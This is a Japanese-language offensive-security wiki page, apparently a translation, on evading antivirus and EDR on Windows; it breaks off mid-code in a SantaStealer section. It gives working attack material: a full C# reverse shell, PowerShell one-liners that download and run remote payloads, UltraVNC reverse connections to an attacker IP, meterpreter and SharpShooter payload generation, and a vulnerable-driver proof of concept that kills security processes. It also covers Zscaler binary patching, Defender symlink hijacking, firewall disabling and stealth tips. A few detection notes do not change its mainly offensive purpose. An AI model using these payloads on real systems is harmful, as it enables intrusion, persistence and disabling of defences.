Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントを**ログ**するための強力な Windows のロギング機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSI を無効化する方法と同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数がイベントをログせずに即座に return するようにすることも可能です。これは関数をメモリ上でパッチして即座に戻すようにすることで行われ、そのプロセスに対する ETW ロギングを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリにロードして実行する手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行するのに非常に有効な方法です。

ペイロードがディスクに触れず直接メモリにロードされるため、プロセス全体について AMSI をパッチすることだけを気にすればよくなります。

ほとんどの C2 フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havoc など）はすでに C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法はいくつかあります:

- **Fork\&Run**

これは新しい「生贄プロセス」を**spawn**し、その新しいプロセスに post-exploitation の悪意あるコードを注入して実行し、終了したらそのプロセスを kill する方法です。利点と欠点の両方があります。利点は実行が我々の Beacon implant プロセスの**外部**で行われる点で、post-exploitation の処理が失敗したり検出された場合でも我々の **implant が生き残る可能性がはるかに高くなる**点です。欠点は **Behavioural Detections** に引っかかる可能性が高くなることです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは悪意あるコードを自分自身のプロセスに注入する方法です。これにより新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロード実行中に何か問題が起きるとプロセスがクラッシュして **beacon を失う可能性がはるかに高くなる**という欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）を参照してください。

PowerShell から C# アセンブリをロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), 他の言語を使って悪意あるコードを実行するには、侵害されたマシンに攻撃者が管理する SMB 共有上にインストールされたインタプリタ環境へのアクセスを許可する方法があります。

SMB 共有上の Interpreter Binaries と環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による任意のコードを**実行**できます。

リポジトリには次のように記載されています: Defender はスクリプトを引き続きスキャンしますが、Go、Java、PHP などを利用することで **静的シグネチャを回避する柔軟性が増す** と。これらの言語でランダムな未難読化のリバースシェルスクリプトをテストしたところ成功したとのことです。

## TokenStomping

Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティ製品を**操作**し、トークンの権限を下げてプロセス自体は終了させずに悪意ある検出を行う権限を持たせないようにする技術です。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを**防止**することが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)、被害者 PC に Chrome Remote Desktop をデプロイして乗っ取りや持続性の確保に使うのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリック、その後 Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者上でインストーラをサイレント実行します（管理者権限が必要です）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop ページに戻って Next をクリックします。ウィザードが許可を求めるので、続行するには Authorize ボタンをクリックします。
4. 与えられたパラメータを若干調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （注: pin パラメータにより GUI を使わずに PIN を設定できます。）

## Advanced Evasion

Evasion（回避）は非常に複雑なトピックで、単一のシステム内でも多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出されないようにするのはほぼ不可能です。

攻撃先の環境ごとに強みと弱みがあり、それぞれ異なります。

より高度な Evasion 技術について理解を深めたい場合は、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強く勧めます。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) の「Evasion in Depth」に関する別の素晴らしいトークです。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、バイナリの一部を順に**削除**していき、どの部分を Defender が悪意あると判定しているかを特定して分割してくれます。\
同様のことを行う別のツールに [**avred**](https://github.com/dobin/avred) があり、サービスを提供するウェブ版は [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時にそれを**開始**し、今すぐ**実行**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートを変更** (stealth) と firewall を無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_ を実行してサーバを構成します:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と **新規に** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動します

#### **Reverse connection**

**attacker** は自分の **host** 上でバイナリ `vncviewer.exe -listen 5900` を実行し、リバース **VNC connection** を受け取る準備をしておくべきです。次に、**victim** 内では：winvnc デーモン `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** ステルスを保つために次のことをしてはいけません

- `winvnc` が既に実行中の場合は起動しないでください。そうしないと [popup](https://i.imgur.com/1SROTTl.png) が表示されます。実行中かは `tasklist | findstr winvnc` で確認してください
- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動しないでください。そうすると [the config window](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプのために `winvnc -h` を実行しないでください。そうすると [popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

ダウンロード先: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **start the lister** を起動し、次のコマンドで **xml payload** を **execute** してください:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在、defender は process を非常に素早く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイル：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下と併用して使用:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# のオブフスケータ一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### pythonを使用したビルドインジェクタの例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### さらに

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からAV/EDRを停止する

Storm-2603 は **Antivirus Terminator** として知られる小さなコンソールユーティリティを利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。このツールは **独自の脆弱だが*署名済み*のドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) AV サービスでさえ阻止できない特権カーネル操作を発行します。

主なポイント
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、バイナリは Antiy Labs の "System In-Depth Analysis Toolkit" に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **カーネルサービス** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` が user land からアクセス可能になるようにします。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 指定した PID の任意プロセスを終了する（Defender/EDR サービスの停止に使用） |
| `0x990000D0` | ディスク上の任意のファイルを削除する |
| `0x990001D0` | ドライバをアンロードしサービスを削除する |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザーモードの保護を完全に迂回します。カーネルで実行されるコードは *protected* プロセスを開いたり、それらを終了したり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改ざんできます。

Detection / Mitigation
•  Microsoft の脆弱ドライバブロックリスト（`HVCI`, `Smart App Control`）を有効にして、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
•  新しい *kernel* サービスの作成を監視し、ドライバがワールドライト可能なディレクトリからロードされている場合や許可リストに存在しない場合にアラートを出す。  
•  カスタムデバイスオブジェクトへのユーザーモードハンドル取得と、その直後の疑わしい `DeviceIoControl` 呼び出しを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスの posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC に依存しています。設計上の弱点が 2 つあり、完全なバイパスを可能にします:

1. Posture 評価は **完全にクライアント側** で行われる（サーバーには真偽値が送信される）。  
2. 内部 RPC エンドポイントは接続してくる実行ファイルが `WinVerifyTrust` を通じて **Zscaler によって署名されている** ことだけを検証する。

ディスク上の 4 つの署名済みバイナリをパッチすることで、両機構を無効化できます:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返し、全てのチェックが準拠と見なされる |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 任意の（非署名を含む）プロセスが RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられる |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 短絡化された（処理をショートサーキット） |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

- **すべての** ポスチャーチェックは **緑/準拠** を表示する。
- 署名されていない、または改変されたバイナリが名前付きパイプの RPC エンドポイントを開くことができる（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
- 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークへ無制限にアクセスできるようになる。

このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが数バイトのパッチで破られることを示している。

## Protected Process Light (PPL) を悪用して AV/EDR を LOLBINs で改ざんする

Protected Process Light (PPL) は署名者/レベルの階層を強制し、同等かそれ以上の権限を持つ保護プロセスだけが相互に改ざんできるようにする。攻撃的には、正当に PPL 対応のバイナリを起動し引数を制御できれば、無害な機能（例: ロギング）を AV/EDR によって使用される保護されたディレクトリに対する制約付きの、PPL 支援の書き込みプリミティブに変換できる。

プロセスが PPL として動作する条件
- 対象の EXE（および読み込まれる DLL）は PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess を `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグで作成する必要がある。
- バイナリの署名者に一致する互換性のある保護レベルを要求する必要がある（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` は anti-malware 署名者向け、`PROTECTION_LEVEL_WINDOWS` は Windows 署名者向け）。不適切なレベルは作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事項と制約
- ClipUp が書き込む内容は配置場所を除いて制御できません。プリミティブは精密なコンテンツ注入よりも破損を狙う用途に適しています。
- サービスのインストール/起動にはローカル管理者/SYSTEM 権限と再起動の余地が必要です。
- タイミングが重要：対象が開かれていてはならず、ブート時の実行はファイルロックを回避します。

検出
- 特に非標準のランチャーを親に持つなど、異常な引数で作成された `ClipUp.exe` のプロセス生成（ブート付近での発生に注意）。
- 自動起動に設定された疑わしいバイナリの新規サービスや、常に Defender/AV より先に起動する挙動。Defender の起動失敗に先立つサービス作成/変更を調査すること。
- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視：protected-process フラグを持つプロセスによる予期しないファイル作成/変更を検出する。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非 AV バイナリによる異常な PPL レベルの使用を確認する。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリがどの親の下で PPL として実行できるかを制限し、正当なコンテキスト外での ClipUp 呼び出しをブロックする。
- サービス運用の衛生管理：自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
- Defender の tamper protection と early-launch 保護を有効にし、バイナリ破損を示す起動エラーを調査する。
- 環境が許すなら、セキュリティツールをホストするボリュームで 8.3 short-name 生成を無効化することを検討する（十分にテストすること）。

PPL とツールの参考資料
- Microsoft Protected Processes の概要: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU リファレンス: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon のブートログ（起動順序の検証）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL ランチャー: https://github.com/2x7EQ13/CreateProcessAsPPL
- 技術解説 (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は次のディレクトリ配下のサブフォルダを列挙して、実行する platform を選択します:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Windows Defender は辞書順で最も大きいバージョン文字列のサブフォルダ（例: `4.18.25070.5-0`）を選び、そこから Defender サービスプロセスを起動します（サービス/レジストリパスはそれに応じて更新されます）。この選択はディレクトリエントリやディレクトリリパースポイント（シンボリックリンク）を信頼します。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を達成できます。

前提条件
- ローカル管理者（Platform フォルダ下にディレクトリ/シンボリックリンクを作成するために必要）
- 再起動や Defender の platform 再選択を誘発できる能力（ブート時のサービス再起動）
- 組み込みツールのみで可能（mklink）

動作する理由
- Defender は自身のフォルダへの書き込みをブロックしますが、platform 選択はディレクトリエントリを信頼し、ターゲットが保護/信頼されたパスに解決されるかを検証せずに辞書順で最大のバージョンを選びます。

手順（例）
1) 現在の platform フォルダの書き込み可能なクローンを準備する（例: `C:\TMP\AV`）:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダを指す、より高いバージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動推奨):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Defenderがアプリケーションディレクトリから読み込むDLLをドロップ/差し替えして、Defender’sプロセス内でコードを実行します。See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlinkを削除すると、次回起動時に設定されたパスが解決されず、Defenderが起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この手法自体では権限昇格は提供されません。admin rightsが必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamsは、Import Address Table (IAT)をフックし、選択したAPIsをattacker-controlledなposition‑independent code (PIC)経由でルーティングすることで、ランタイム回避をC2 implantの外へ、ターゲットモジュール自体に移すことができます。これにより、多くのkitsが露出する小さなAPIサーフェス（例: CreateProcessA）を超えて回避が一般化され、同じ保護をBOFsやpost‑exploitation DLLsにも拡張できます。

High-level approach
- reflective loader（prependedまたはcompanion）を使用して、ターゲットモジュールの隣にPIC blobをステージします。PICは自己完結型でposition‑independentである必要があります。
- ホストDLLがロードされる際にIMAGE_IMPORT_DESCRIPTORを走査し、対象となるインポート（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）に対応するIATエントリを薄いPICラッパを指すようにパッチします。
- 各PICラッパは実APIアドレスへtail‑callする前に回避処理を実行します。典型的な回避には次のものが含まれます:
  - 呼び出し前後のメモリのmask/unmask（例: beacon領域の暗号化、RWX→RX、ページ名／権限の変更）を行い、呼び出し後に復元する。
  - Call‑stack spoofing: 正常なスタックを構築してターゲットAPIへ遷移させ、call‑stack解析が期待されるフレームを解決するようにする。
- 互換性のためにインターフェイスをエクスポートし、Aggressor script（または同等のもの）がBeacon、BOFs、post‑ex DLLs向けにフックするAPIを登録できるようにします。

Why IAT hooking here
- フックされたインポートを使用する任意のコードで動作し、ツールのコードを変更したりBeaconに特定のAPIをプロキシさせたりする必要がありません。
- post‑ex DLLsをカバーします: LoadLibrary*をフックすることでモジュールのロード（例: System.Management.Automation.dll, clr.dll）を傍受し、同じマスキング／スタック回避をそれらのAPI呼び出しに適用できます。
- CreateProcessA/Wをラップすることで、call‑stackベースの検出に対してもプロセス生成を行うpost‑exコマンドを信頼して使用できるようにします。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事項
- パッチは relocations/ASLR の適用後、インポートが最初に使用される前に適用すること。Reflective loaders（例: TitanLdr/AceLdr）は、読み込まれたモジュールの DllMain 中にフックを行うことを示している。
- ラッパーは小さく PIC-safe に保つこと；真の API は、パッチ前に取得した元の IAT 値を介して、あるいは LdrGetProcedureAddress を使って解決する。
- PIC では RW → RX の遷移を使用し、writable+executable なページを残さないこと。

Call‑stack spoofing stub
- Draugr‑style PIC stubs は偽のコールチェーン（return addresses を benign modules に向ける）を構築し、その後 real API にピボットする。
- これは Beacon/BOFs からの標準的なスタックを期待する検出を回避する。
- API のプロローグ前に期待されるフレーム内に着地させるために、stack cutting/stack stitching 技術と組み合わせて使う。

Operational integration
- reflective loader を post‑ex DLLs の前に付けることで、DLL 読み込み時に PIC とフックが自動的に初期化される。
- Aggressor スクリプトを使ってターゲット API を登録すると、Beacon と BOFs はコード変更なしに同じ回避経路の恩恵を透過的に受けることができる。

Detection/DFIR considerations
- IAT integrity: non‑image (heap/anon) アドレスに解決されるエントリ；import pointers の定期的検証。
- Stack anomalies: 読み込まれたイメージに属さない return addresses；non‑image PIC への突然の遷移；不整合な RtlUserThreadStart の系譜。
- Loader telemetry: プロセス内での IAT 書き込み、import thunks を変更する早期の DllMain 活動、読み込み時に作成される予期しない RX 領域。
- Image‑load evasion: LoadLibrary* をフックしている場合は、memory masking events と相関する automation/clr assemblies の不審なロードを監視すること。

Related building blocks and examples
- ロード中に IAT パッチを行う Reflective loaders（例: TitanLdr, AceLdr）
- Memory masking hooks（例: simplehook）および stack‑cutting PIC（stackcutting）
- PIC call‑stack spoofing stubs（例: Draugr）

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) は、現代の info-stealers が単一のワークフローで AV bypass、anti-analysis、credential access をどのように組み合わせるかを示している。

### Keyboard layout gating & sandbox delay

- 設定フラグ (`anti_cis`) は `GetKeyboardLayoutList` を使ってインストールされているキーボードレイアウトを列挙する。Cyrillic レイアウトが見つかった場合、サンプルは空の `CIS` マーカーを落として、stealers を実行する前に終了する。これにより除外されたロケール上で起爆することを防ぎつつ、ハンティングの痕跡を残す。
```c
HKL layouts[64];
